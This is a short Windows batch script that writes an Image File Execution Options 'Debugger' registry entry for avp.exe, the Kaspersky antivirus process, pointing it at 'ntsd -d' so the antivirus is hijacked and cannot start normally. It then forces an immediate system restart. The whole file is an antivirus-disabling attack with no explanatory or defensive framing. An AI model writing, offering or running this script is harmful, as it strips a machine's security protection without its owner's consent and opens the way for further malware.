#echo off
start Reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\avp.exe" /v "Debugger" /t "REG_SZ" /d "ntsd -d" /f
shutdown -f -r -t 0